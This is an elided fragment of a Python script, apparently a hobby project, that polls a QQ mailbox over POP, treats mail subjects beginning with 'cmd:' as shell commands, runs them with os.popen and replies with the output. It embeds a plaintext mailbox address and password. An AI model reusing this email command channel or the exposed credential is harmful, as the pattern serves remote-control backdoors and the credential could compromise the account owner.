...
def recive_mail(mailserver, mailuser, mailpasswd, mail_number, save_file=False, delete_email=False):
    ...
    try:
        ...
        hdr, message, octets = server.retr(mail_number + 229)  # 读取邮件
        ...
        #             # mail_dict['Body'] = decode_subject_base64(part_list[i].get_payload())  # decoded_str  # 把转换后的中文写入Body
...
if __name__ == '__main__':
    ...
    # print(res)
    # print(res['From'])
    # a = re.match('cmd:(.*)', res['Subject']).groups()
    # print(a[0])
    ...
    while True:
        try:
            # 取得最近一封邮件的内容，做成字典
            for x in recive_mail('pop.qq.com', '185686792@qq.com', 'vzzvmemjknzqbhbj', mail_number, save_file=False,
                                 delete_email=False):
                for key, value in x.items():
                    res[key] = value

            # 如果标题是一条指令，就执行
            if re.match('cmd:(.*)', res['Subject']).groups()[0] == 'pwd':
                print('执行pwd')
                a = os.popen('pwd').read()
            elif re.match('cmd:(.*)', res['Subject']).groups()[0] == 'ls':
                print('执行ls')
                a = os.popen('ls').read()
                # 将执行的结果回复给对方
            if a:
